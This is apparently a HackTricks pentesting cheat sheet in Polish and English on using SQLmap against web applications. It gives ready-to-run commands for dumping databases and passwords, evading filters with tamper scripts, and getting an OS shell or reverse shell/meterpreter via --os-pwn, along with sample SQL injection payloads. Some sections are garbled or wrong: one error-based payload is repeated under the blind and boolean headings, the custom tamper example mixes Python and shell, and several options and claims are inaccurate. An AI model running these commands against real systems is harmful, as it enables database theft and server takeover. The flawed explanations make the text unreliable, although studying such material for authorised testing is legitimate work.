<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>


# Podstawowe argumenty dla SQLmap

## Ogólne
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## Pobierz informacje

### Wewnętrzne
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### Dane bazy danych

To retrieve data from a database, you can use the following SQL injection techniques:

#### 1. UNION-based SQL Injection

This technique involves injecting a UNION statement into the original SQL query to combine the results of two separate queries. By manipulating the UNION statement, you can retrieve data from other tables in the database.

Example:

```
SELECT column1, column2 FROM table1 UNION SELECT column3, column4 FROM table2
```

#### 2. Error-based SQL Injection

In error-based SQL injection, you intentionally trigger an error in the SQL query to extract information from the database error message. By injecting malicious input, you can force the database to reveal sensitive data.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 3. Blind SQL Injection

Blind SQL injection is a technique used when the application does not display database errors. It involves injecting queries that result in a true or false response from the application. By manipulating the injected queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 4. Time-based Blind SQL Injection

Time-based blind SQL injection is similar to blind SQL injection, but it relies on the application's response time to determine if the injected query is true or false. By injecting time-delayed queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND IF(ASCII(SUBSTRING((SELECT column2 FROM table2 LIMIT 0,1),1,1))=97, SLEEP(5), 0)
```

#### 5. Boolean-based Blind SQL Injection

Boolean-based blind SQL injection is another variation of blind SQL injection. It involves injecting queries that result in a true or false response from the application. By manipulating the injected queries, you can extract data from the database.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(1=1,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

#### 6. Out-of-band SQL Injection

Out-of-band SQL injection is a technique used when the application is unable to display the results of the injected query. Instead, the attacker uses a different channel to retrieve the data, such as DNS requests or HTTP requests to an external server.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT column2 FROM table2 LIMIT 0,1), '\\\\filename.txt')))
```

#### 7. Stored Procedure SQL Injection

Stored procedure SQL injection occurs when an attacker injects malicious input into a stored procedure call. By manipulating the input, an attacker can execute arbitrary SQL code and retrieve data from the database.

Example:

```
EXECUTE dbo.usp_GetData @param1 = '1'; DROP TABLE table1; --'
```

#### 8. Second-Order SQL Injection

Second-order SQL injection occurs when user input is stored in the database and later used in a vulnerable query. By injecting malicious input during the initial input, an attacker can execute arbitrary SQL code when the stored input is used in a query.

Example:

```
INSERT INTO table1 (column1) VALUES ('1'); SELECT * FROM table2 WHERE id = (SELECT MAX(id) FROM table1);
```

#### 9. Time Delay SQL Injection

Time delay SQL injection involves injecting time-delayed queries to extract data from the database. By manipulating the injected queries, an attacker can cause the application to delay its response, revealing sensitive information.

Example:

```
SELECT column1 FROM table1 WHERE id='1' AND IF(ASCII(SUBSTRING((SELECT column2 FROM table2 LIMIT 0,1),1,1))=97, SLEEP(5), 0)
```

Remember to always use these techniques responsibly and with proper authorization.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# Miejsce wstrzyknięcia

## Z przechwycenia Burp/ZAP

Przechwyć żądanie i utwórz plik req.txt
```bash
sqlmap -r req.txt --current-user
```
## Wstrzykiwanie zapytań GET

### SQL Injection

SQL Injection (wstrzykiwanie kodu SQL) jest jednym z najczęstszych ataków na aplikacje internetowe. Polega na wstrzyknięciu złośliwego kodu SQL do zapytania, które jest wykonywane przez aplikację. Atakujący może wykorzystać tę lukę w celu wykonania nieautoryzowanych operacji na bazie danych, odczytania poufnych informacji lub nawet przejęcia kontroli nad aplikacją.

### Wykrywanie SQL Injection za pomocą SQLMap

SQLMap to potężne narzędzie do automatycznego wykrywania i eksploatacji podatności SQL Injection. Może być używane do testowania bezpieczeństwa aplikacji internetowych i znajdowania luk w zabezpieczeniach.

Aby wykryć podatność na SQL Injection w zapytaniu GET, możemy użyć SQLMap w następujący sposób:

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

W powyższym przykładzie, `http://example.com/page.php?id=1` to adres URL strony, na której chcemy przetestować podatność. Parametr `--dbs` informuje SQLMap, że chcemy wyświetlić dostępne bazy danych.

Po uruchomieniu powyższej komendy, SQLMap automatycznie przetestuje podatność na SQL Injection w zapytaniu GET i wyświetli wyniki.

### Eksploatacja SQL Injection za pomocą SQLMap

Jeśli SQLMap wykryje podatność na SQL Injection, możemy użyć go do eksploatacji tej luki. Na przykład, jeśli chcemy wyświetlić zawartość tabeli `users`, możemy użyć następującej komendy:

```plaintext
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump
```

W powyższym przykładzie, `database_name` to nazwa bazy danych, a `users` to nazwa tabeli, której zawartość chcemy wyświetlić. Parametr `--dump` informuje SQLMap, że chcemy wyświetlić dane z tabeli.

SQLMap automatycznie wykona zapytanie SQL i wyświetli wyniki, w tym wrażliwe informacje, takie jak hasła użytkowników.

### Podsumowanie

Wstrzykiwanie zapytań GET jest powszechną techniką ataku SQL Injection. SQLMap jest potężnym narzędziem, które może pomóc w wykrywaniu i eksploatacji podatności SQL Injection w zapytaniach GET. Pamiętaj, że wykorzystywanie tych technik do celów nieautoryzowanych jest nielegalne i może prowadzić do konsekwencji prawnych.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## Wstrzykiwanie żądania POST

Wstrzykiwanie żądania POST jest podobne do wstrzykiwania żądania GET, ale różni się sposobem przekazywania danych. W przypadku żądania POST dane są przesyłane w ciele żądania, a nie w parametrach URL.

### Wykrywanie wstrzykiwania żądania POST

Aby wykryć podatność na wstrzykiwanie żądania POST, możemy użyć narzędzia SQLMap. Narzędzie to automatyzuje proces wykrywania i eksploatacji podatności na wstrzykiwanie SQL.

### Użycie SQLMap do wstrzykiwania żądania POST

Aby użyć SQLMap do wstrzykiwania żądania POST, musimy dostarczyć narzędziu odpowiednie dane wejściowe. Możemy to zrobić na kilka sposobów:

1. Podając bezpośrednio dane wejściowe w linii poleceń.
2. Zapisując dane wejściowe do pliku i przekazując go jako argument.
3. Korzystając z interaktywnego trybu SQLMap.

Po dostarczeniu danych wejściowych, SQLMap automatycznie przetestuje podatność na wstrzykiwanie SQL i spróbuje eksploatować znalezione podatności.

### Przykład użycia SQLMap do wstrzykiwania żądania POST

Poniżej przedstawiony jest przykład użycia SQLMap do wstrzykiwania żądania POST:

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=test" --method POST
```

W powyższym przykładzie SQLMap wysyła żądanie POST na adres URL "http://example.com/login" z danymi "username=admin&password=test". Narzędzie automatycznie wykrywa podatność na wstrzykiwanie SQL i próbuje ją eksploatować.

### Podsumowanie

Wstrzykiwanie żądania POST jest podobne do wstrzykiwania żądania GET, ale różni się sposobem przekazywania danych. Narzędzie SQLMap może być użyte do wykrywania i eksploatacji podatności na wstrzykiwanie SQL w żądaniach POST.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Wstrzykiwanie w nagłówkach i innych metodach HTTP

### Wstrzykiwanie w nagłówkach

W przypadku niektórych aplikacji internetowych, wstrzykiwanie może być możliwe poprzez manipulację nagłówkami HTTP. Wstrzykiwanie w nagłówkach może prowadzić do różnych ataków, takich jak ataki XSS (Cross-Site Scripting) lub ataki CSRF (Cross-Site Request Forgery).

#### Wstrzykiwanie w nagłówku User-Agent

Wstrzykiwanie w nagłówku User-Agent jest możliwe, gdy aplikacja internetowa wykonuje pewne operacje na podstawie wartości tego nagłówka. Aby przeprowadzić atak, należy zmodyfikować wartość nagłówka User-Agent, aby zawierała złośliwy kod. Następnie, gdy aplikacja internetowa przetwarza ten nagłówek, kod zostanie wykonany, co może prowadzić do różnych ataków.

#### Wstrzykiwanie w nagłówku Referer

Podobnie jak w przypadku nagłówka User-Agent, wstrzykiwanie w nagłówku Referer jest możliwe, gdy aplikacja internetowa wykonuje pewne operacje na podstawie wartości tego nagłówka. Atakujący może zmodyfikować wartość nagłówka Referer, aby zawierała złośliwy kod. Gdy aplikacja internetowa przetwarza ten nagłówek, kod zostanie wykonany, co może prowadzić do różnych ataków.

### Wstrzykiwanie w innych metodach HTTP

Oprócz nagłówków HTTP, wstrzykiwanie może być również możliwe w innych metodach HTTP, takich jak parametry URL, ciało żądania, metoda żądania, nagłówki żądania, nagłówki odpowiedzi itp. Wstrzykiwanie w tych miejscach może prowadzić do różnych ataków, takich jak ataki SQL Injection, ataki Command Injection itp.

W celu przeprowadzenia ataku wstrzykiwania w innych metodach HTTP, należy zidentyfikować odpowiednie miejsce do wstrzykiwania kodu i dostarczyć odpowiednie dane, które spowodują wykonanie złośliwego kodu przez aplikację internetową.

#### Przykład: Wstrzykiwanie w parametrze URL

W przypadku ataku SQL Injection, atakujący może wstrzyknąć złośliwy kod SQL poprzez parametr URL. Aby to zrobić, atakujący musi zidentyfikować odpowiedni parametr URL, który jest podatny na wstrzykiwanie i dostarczyć odpowiednie dane, które spowodują wykonanie złośliwego kodu SQL przez aplikację internetową.

#### Przykład: Wstrzykiwanie w ciele żądania

W przypadku ataku Command Injection, atakujący może wstrzyknąć złośliwy kod systemowy poprzez ciało żądania HTTP. Aby to zrobić, atakujący musi zidentyfikować odpowiednie miejsce w ciele żądania, które jest podatne na wstrzykiwanie i dostarczyć odpowiednie dane, które spowodują wykonanie złośliwego kodu systemowego przez aplikację internetową.

### Podsumowanie

Wstrzykiwanie w nagłówkach i innych metodach HTTP może prowadzić do różnych ataków, takich jak ataki XSS, ataki CSRF, ataki SQL Injection, ataki Command Injection itp. Aby przeprowadzić atak, atakujący musi zidentyfikować odpowiednie miejsce do wstrzykiwania kodu i dostarczyć odpowiednie dane, które spowodują wykonanie złośliwego kodu przez aplikację internetową.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## Wstrzykiwanie drugiego rzędu

Wstrzykiwanie drugiego rzędu to zaawansowana technika ataku polegająca na wykorzystaniu podatności SQL Injection w celu wykonania złośliwego kodu w późniejszym czasie. W przeciwieństwie do tradycyjnego wstrzykiwania SQL, wstrzykiwanie drugiego rzędu nie wykonuje kodu natychmiast, ale zapisuje go w bazie danych lub w innych miejscach, gdzie będzie mógł być wykorzystany w przyszłości.

W celu przeprowadzenia ataku wstrzykiwania drugiego rzędu, należy znaleźć podatność SQL Injection, która pozwoli na zapisanie złośliwego kodu w bazie danych. Następnie, gdy aplikacja wykorzysta ten kod w przyszłości, zostanie on wykonany, umożliwiając atakującemu uzyskanie nieautoryzowanego dostępu lub wykonanie innych złośliwych działań.

Aby wykorzystać wstrzykiwanie drugiego rzędu, można użyć narzędzia takiego jak SQLMap, które automatyzuje proces wykrywania i eksploatacji podatności SQL Injection. Narzędzie to pozwala na przeprowadzenie ataku wstrzykiwania drugiego rzędu poprzez zapisanie złośliwego kodu w bazie danych i wykorzystanie go w późniejszym czasie.

Wstrzykiwanie drugiego rzędu jest bardziej zaawansowaną techniką ataku, która wymaga dogłębnej wiedzy na temat SQL Injection i struktury bazy danych. Jednakże, jeśli zostanie poprawnie wykorzystana, może być bardzo skutecznym narzędziem dla hakerów, umożliwiającym wykonanie złośliwego kodu w celu uzyskania nieautoryzowanego dostępu do systemu.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Powłoka

### SQLMap

SQLMap to popularne narzędzie do automatycznego wykrywania i eksploatacji podatności SQL Injection. Może być używane do testowania bezpieczeństwa aplikacji internetowych i wykrywania luk w zabezpieczeniach.

#### Instalacja

Aby zainstalować SQLMap, wykonaj następujące kroki:

1. Pobierz najnowszą wersję SQLMap z [oficjalnego repozytorium](https://github.com/sqlmapproject/sqlmap).
2. Rozpakuj pobrane archiwum.
3. Przejdź do katalogu z rozpakowanymi plikami.
4. Uruchom SQLMap za pomocą polecenia `python sqlmap.py`.

#### Podstawowe użycie

Aby przeprowadzić testy SQL Injection za pomocą SQLMap, wykonaj następujące kroki:

1. Uruchom SQLMap, podając adres URL docelowej aplikacji jako argument.
2. Wybierz odpowiednie opcje, takie jak metoda ataku, poziom ryzyka i technika wstrzykiwania.
3. Uruchom skanowanie, używając polecenia `--scan` lub `--dbs` w celu wylistowania dostępnych baz danych.
4. Wybierz konkretną bazę danych, używając polecenia `--db`.
5. Wylistuj tabele w wybranej bazie danych, używając polecenia `--tables`.
6. Wybierz konkretną tabelę, używając polecenia `--table`.
7. Wylistuj kolumny w wybranej tabeli, używając polecenia `--columns`.
8. Wybierz konkretne kolumny, używając polecenia `--dump`.

#### Eksploatacja podatności

Po zidentyfikowaniu podatności SQL Injection, SQLMap może być używane do eksploatacji tych luk w zabezpieczeniach. Aby to zrobić, wykonaj następujące kroki:

1. Uruchom SQLMap, podając adres URL docelowej aplikacji jako argument.
2. Wybierz odpowiednie opcje, takie jak metoda ataku, poziom ryzyka i technika wstrzykiwania.
3. Uruchom eksploatację, używając polecenia `--dump-all` lub `--dump` w celu wydobycia danych z bazy danych.
4. Wybierz konkretne dane do wydobycia, używając polecenia `--columns` i `--dump`.

#### Dodatkowe funkcje

SQLMap oferuje wiele dodatkowych funkcji, które mogą być przydatne podczas testowania aplikacji internetowych. Niektóre z tych funkcji to:

- Wstrzykiwanie kodu SQL do plików konfiguracyjnych.
- Wstrzykiwanie kodu SQL do nagłówków HTTP.
- Wstrzykiwanie kodu SQL do parametrów POST i GET.
- Wstrzykiwanie kodu SQL do plików XML i JSON.
- Wstrzykiwanie kodu SQL do danych użytkownika.
- Wstrzykiwanie kodu SQL do zapytań LDAP.
- Wstrzykiwanie kodu SQL do zapytań DNS.

#### Zabezpieczenia przed SQL Injection

Aby zabezpieczyć aplikację przed atakami SQL Injection, należy podjąć odpowiednie środki ostrożności. Niektóre z zalecanych praktyk to:

- Używanie parametryzowanych zapytań SQL.
- Walidacja i filtrowanie danych wejściowych.
- Unikanie dynamicznych zapytań SQL.
- Używanie mechanizmów ochrony przed atakami SQL Injection dostarczanych przez frameworki i biblioteki programistyczne.
- Regularne aktualizowanie oprogramowania w celu usuwania znanych podatności.

#### Podsumowanie

SQLMap to potężne narzędzie do testowania bezpieczeństwa aplikacji internetowych pod kątem podatności SQL Injection. Może być używane do wykrywania i eksploatacji luk w zabezpieczeniach, a także do przeprowadzania różnych testów i analizy bazy danych. Pamiętaj jednak, że używanie SQLMap do celów nielegalnych lub bez zgody właściciela systemu jest niezgodne z prawem.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## Przeszukiwanie strony internetowej za pomocą SQLmap i automatyczne wykorzystanie podatności

SQLmap is a powerful tool used for automating the process of detecting and exploiting SQL injection vulnerabilities in web applications. It is capable of crawling a website, identifying potential injection points, and automatically exploiting them.

### Crawling a website

Before exploiting SQL injection vulnerabilities, it is important to crawl the target website to identify potential injection points. This can be done using the following command:

```bash
sqlmap -u <target_url> --crawl=<depth>
```

Replace `<target_url>` with the URL of the website you want to crawl and `<depth>` with the desired depth of the crawl. The depth determines how many levels deep SQLmap will crawl the website.

### Identifying injection points

Once the website has been crawled, SQLmap will identify potential injection points and display them in the output. These injection points can be URLs, form parameters, cookies, or HTTP headers.

### Exploiting injection points

To automatically exploit the identified injection points, you can use the following command:

```bash
sqlmap -u <target_url> --data=<post_data> --cookie=<cookie_data> --headers=<header_data> --level=<level> --risk=<risk>
```

Replace `<target_url>` with the URL of the website, `<post_data>` with the POST data (if applicable), `<cookie_data>` with the cookie data (if applicable), `<header_data>` with the header data (if applicable), `<level>` with the level of tests to perform (1-5, with 5 being the most thorough), and `<risk>` with the risk level of tests to perform (1-3, with 3 being the most risky).

SQLmap will automatically test the identified injection points for vulnerabilities and attempt to exploit them.

### Conclusion

By using SQLmap to crawl a website and automatically exploit SQL injection vulnerabilities, you can efficiently identify and exploit potential security flaws in web applications. However, it is important to ensure that you have proper authorization and legal permission before performing any penetration testing activities.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
Sometimes, you may encounter situations where the SQL injection payload needs to be appended with a specific suffix. This can be achieved by using the `--suffix` option in SQLMap.

To set a suffix, use the following command:

```
sqlmap -u <target_url> --suffix=<suffix>
```

Replace `<target_url>` with the URL of the vulnerable website and `<suffix>` with the desired suffix.

For example, if you want to append the payload with the suffix `--`, the command would be:

```
sqlmap -u <target_url> --suffix=--
```

This will add `--` at the end of the SQL injection payload.

Using the `--suffix` option can be helpful in scenarios where the application requires a specific character or string to be present after the injection payload.
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## Prefiks
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## Pomoc w wyszukiwaniu wstrzyknięcia boolean

To find boolean-based SQL injection vulnerabilities, you can use the SQLMap tool. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection flaws.

First, you need to identify the vulnerable parameter in the target URL. This parameter is usually found in the query string or in the form data. Once you have identified the parameter, you can proceed with the following steps:

1. Use the `--level` and `--risk` options to set the scanning level and risk level respectively. Higher levels increase the thoroughness of the scan but also increase the chances of causing disruptions.

2. Use the `--dbms` option to specify the database management system (DBMS) used by the target application. This helps SQLMap to optimize the payloads and techniques for the specific DBMS.

3. Use the `--technique` option to specify the injection technique. For boolean-based injection, you can use the `B` technique.

4. Use the `--tamper` option to specify tampering scripts. These scripts modify the payloads sent by SQLMap to bypass security filters. For boolean-based injection, you can use the `boolean-based` tamper script.

5. Use the `--dbs` option to enumerate the available databases on the target server. This helps you to identify the database names that you can further exploit.

6. Use the `--tables` option to enumerate the tables in a specific database. This helps you to identify the table names that you can further exploit.

7. Use the `--columns` option to enumerate the columns in a specific table. This helps you to identify the column names that you can further exploit.

By following these steps, you can effectively use SQLMap to find boolean-based SQL injection vulnerabilities and gather valuable information from the target database. Remember to always obtain proper authorization before conducting any penetration testing activities.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Modyfikacja

Tamper to funkcja w narzędziu SQLMap, która pozwala na modyfikację żądań HTTP i odpowiedzi serwera w celu obejścia zabezpieczeń i manipulacji danymi. Działa poprzez aplikowanie różnych technik modyfikacji na parametry żądania, co może pomóc w ominięciu filtrów i wykryciu podatności na SQL Injection.

### Użycie

Aby użyć funkcji Tamper w SQLMap, należy dodać flagę `--tamper` po nazwie narzędzia. Następnie można wybrać jedną lub wiele technik modyfikacji, które zostaną zastosowane do żądań i odpowiedzi. Przykład użycia:

```
sqlmap -u http://example.com/login.php --tamper=apostrophemask,randomcase
```

W powyższym przykładzie używane są dwie techniki modyfikacji: `apostrophemask` i `randomcase`. Pierwsza technika zamienia pojedyncze cudzysłowy na różne kombinacje, aby obejść filtrowanie znaków specjalnych. Druga technika losowo zmienia wielkość liter w żądaniu i odpowiedzi, co może pomóc w uniknięciu wykrycia przez systemy detekcji.

### Dostępne techniki modyfikacji

SQLMap oferuje wiele różnych technik modyfikacji, które można zastosować przy użyciu funkcji Tamper. Niektóre z popularnych technik to:

- `apostrophemask`: zamienia pojedyncze cudzysłowy na różne kombinacje
- `randomcase`: losowo zmienia wielkość liter w żądaniu i odpowiedzi
- `space2comment`: zamienia spacje na komentarze, aby obejść filtrowanie
- `chardoubleencode`: koduje znaki specjalne jako podwójne encje
- `equaltolike`: zamienia operator równości na operator `LIKE`

Pełną listę dostępnych technik modyfikacji można znaleźć w dokumentacji SQLMap.

### Tworzenie własnych technik modyfikacji

Jeśli żadna z dostępnych technik modyfikacji nie spełnia wymagań, można również stworzyć własną technikę. W tym celu należy utworzyć plik Pythona zawierający funkcję modyfikacji i przekazać ścieżkę do tego pliku jako argument `--tamper`. Funkcja powinna przyjmować jako argumenty łańcuch znaków `payload` i `**kwargs`, a następnie zwracać zmodyfikowany łańcuch znaków.

Przykład własnej techniki modyfikacji:

```python
def mytamper(payload, **kwargs):
    return payload.replace("SELECT", "SELECt")

sqlmap -u http://example.com/login.php --tamper=/path/to/mytamper.py
```

W powyższym przykładzie tworzona jest własna technika modyfikacji, która zamienia wszystkie wystąpienia słowa "SELECT" na "SELECt" w żądaniu.
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | Opis |
| :--- | :--- |
| apostrophemask.py | Zamienia znak apostrofu na jego pełnowymiarowy odpowiednik w UTF-8 |
| apostrophenullencode.py | Zamienia znak apostrofu na jego nielegalny podwójny odpowiednik unicode |
| appendnullbyte.py | Dodaje zakodowany znak NULL na końcu ładunku |
| base64encode.py | Koduje Base64 wszystkie znaki w podanym ładunku |
| between.py | Zamienia operator większy niż \('&gt;'\) na 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Zamienia znak spacji po instrukcji SQL na poprawny losowy znak pusty. Następnie zamienia znak '=' na operator LIKE |
| chardoubleencode.py | Podwójnie koduje URL wszystkie znaki w podanym ładunku \(nie przetwarzając już zakodowanych\) |
| commalesslimit.py | Zamienia wystąpienia 'LIMIT M, N' na 'LIMIT N OFFSET M' |
| commalessmid.py | Zamienia wystąpienia 'MID\(A, B, C\)' na 'MID\(A FROM B FOR C\)' |
| concat2concatws.py | Zamienia wystąpienia 'CONCAT\(A, B\)' na 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | Koduje URL wszystkie znaki w podanym ładunku \(nie przetwarzając już zakodowanych\) |
| charunicodeencode.py | Koduje Unicode URL niezakodowane znaki w podanym ładunku \(nie przetwarzając już zakodowanych\). "%u0022" |
| charunicodeescape.py | Koduje Unicode URL niezakodowane znaki w podanym ładunku \(nie przetwarzając już zakodowanych\). "\u0022" |
| equaltolike.py | Zamienia wszystkie wystąpienia operatora równości \('='\) na operator 'LIKE' |
| escapequotes.py | Ucieka przed cudzysłowami \(' and "\) |
| greatest.py | Zamienia operator większy niż \('&gt;'\) na odpowiednik 'GREATEST' |
| halfversionedmorekeywords.py | Dodaje wersjonowany komentarz MySQL przed każdym słowem kluczowym |
| ifnull2ifisnull.py | Zamienia wystąpienia 'IFNULL\(A, B\)' na 'IF\(ISNULL\(A\), B, A\)' |
| modsecurityversioned.py | Otacza całe zapytanie wersjonowanym komentarzem |
| modsecurityzeroversioned.py | Otacza całe zapytanie zerowym wersjonowanym komentarzem |
| multiplespaces.py | Dodaje wiele spacji wokół słów kluczowych SQL |
| nonrecursivereplacement.py | Zamienia predefiniowane słowa kluczowe SQL na odpowiednie reprezentacje do zastąpienia \(np. .replace\("SELECT", ""\)\) filtrowane |
| percentage.py | Dodaje znak procenta \('%'\) przed każdym znakiem |
| overlongutf8.py | Konwertuje wszystkie znaki w podanym ładunku \(nie przetwarzając już zakodowanych\) |
| randomcase.py | Zamienia każdy znak słowa kluczowego na losową wartość wielkości liter |
| randomcomments.py | Dodaje losowe komentarze do słów kluczowych SQL |
| securesphere.py | Dodaje specjalnie spreparowany ciąg znaków |
| sp\_password.py | Dodaje 'sp\_password' na końcu ładunku w celu automatycznego zaciemnienia w dziennikach DBMS |
| space2comment.py | Zamienia znak spacji \(' '\) na komentarze |
| space2dash.py | Zamienia znak spacji \(' '\) na komentarz myślnika \('--'\) po którym następuje losowy ciąg znaków i nowa linia \('\n'\) |
| space2hash.py | Zamienia znak spacji \(' '\) na znak krzyżyka \('\#'\) po którym następuje losowy ciąg znaków i nowa linia \('\n'\) |
| space2morehash.py | Zamienia znak spacji \(' '\) na znak krzyżyka \('\#'\) po którym następuje losowy ciąg znaków i nowa linia \('\n'\) |
| space2mssqlblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znaków |
| space2mssqlhash.py | Zamienia znak spacji \(' '\) na znak krzyżyka \('\#'\) po którym następuje nowa linia \('\n'\) |
| space2mysqlblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znaków |
| space2mysqldash.py | Zamienia znak spacji \(' '\) na komentarz myślnika \('--'\) po którym następuje nowa linia \('\n'\) |
| space2plus.py | Zamienia znak spacji \(' '\) na plus \('+'\) |
| space2randomblank.py | Zamienia znak spacji \(' '\) na losowy znak pusty z zestawu alternatywnych poprawnych znaków |
| symboliclogical.py | Zamienia operatory logiczne AND i OR na ich symboliczne odpowiedniki \(&& i |
| unionalltounion.py | Zamienia UNION ALL SELECT na UNION SELECT |
| unmagicquotes.py | Zamienia znak cudzysłowu \('\) na wielobajtową kombinację %bf%27 wraz z ogólnym komentarzem na końcu \(aby działało\) |
| uppercase.py | Zamienia każdy znak słowa kluczowego na wartość wielkich liter 'INSERT' |
| varnish.py | Dodaje nagłówek HTTP 'X-originating-IP' |
| versionedkeywords.py | Otacza każde słowo kluczowe bez funkcji wersjonowanym komentarzem MySQL |
| versionedmorekeywords.py | Otacza każde słowo kluczowe wersjonowanym komentarzem MySQL |
| xforwardedfor.py | Dodaje fałszywy nagłówek HTTP 'X-Forwarded-For' |



<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
